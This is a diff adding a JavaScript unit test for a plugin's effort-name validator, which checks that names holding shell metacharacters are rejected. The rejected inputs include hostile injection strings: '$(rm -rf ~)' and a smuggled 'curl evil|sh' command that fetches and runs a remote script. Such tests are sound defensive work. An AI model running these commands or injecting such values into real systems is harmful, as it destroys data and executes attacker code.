@@ -48,3 +48,10 @@ test('renderHostProse layout; empty sections omitted', () => {
   assert.equal(out, '📍 e\n\nGoal: ship v1\n\nDecided\n- token file (r1.2)\n\nOpen\n- r2.1 Where? — ⭐ file');
   assert.equal(renderHostProse({ effort: 'e', host: { goal: '', decided: [], open: [], notAsked: [] } }), '📍 e\n\nGoal: —');
 });
+
+test('effort name rule: letters/digits/space/._- , 1–60 chars, starts alphanumeric; nothing a shell would expand', async () => {
+  const { isValidEffort, checkEffort, EFFORT_RULE } = await import('../../plugins/grill-over-ticktick/lib/state.mjs');
+  for (const ok of ['e', 'my effort', 'tickgrill-auth', 'v1.2_x', 'A'.repeat(60)]) assert.equal(isValidEffort(ok), true, ok);
+  for (const bad of ['', ' x', '.x', '-x', 'x"y', "x'y", '$(rm -rf ~)', 'a`b`', 'a\nb', 'a;b', 'a/b', 'A'.repeat(61), '🔥 x', undefined]) assert.equal(isValidEffort(bad), false, String(bad));
+  assert.throws(() => checkEffort('x"; curl evil|sh; "'), (/** @type {any} */ e) => e.exitCode === 2 && e.message.includes(EFFORT_RULE));
+});
